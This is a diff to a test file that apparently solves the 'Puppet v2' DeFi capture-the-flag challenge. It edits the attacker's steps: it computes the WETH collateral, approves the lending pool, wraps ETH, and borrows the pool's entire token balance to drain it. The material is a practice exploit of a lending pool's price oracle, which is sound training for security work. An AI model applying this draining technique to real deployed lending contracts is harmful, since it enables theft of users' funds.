@@ -88,12 +88,15 @@ describe("[Challenge] Puppet v2", function () {
         attacker.address,
         10000000000
       );
+
+    let collateral = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
     // approve lending pool to transfer attackers WETH
-    await this.weth.connect(attacker).approve(this.lendingPool.address, ethers.utils.parseEther("30"));
+    await this.weth.connect(attacker).approve(this.lendingPool.address, collateral);
     // Deposit ETH into WETH, saving 1% for Gas
     const ethBalance = await ethers.provider.getBalance(attacker.address);
-    const newEthBalance = ethBalance.div(100).mul(99);
-    await this.weth.connect(attacker).deposit({value: newEthBalance});
+    collateral = ethBalance.div(100).mul(99);
+    await this.weth.connect(attacker).deposit({value: collateral});
 
     // Attacker has sufficient WETH balance to drain DVT tokens
     await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
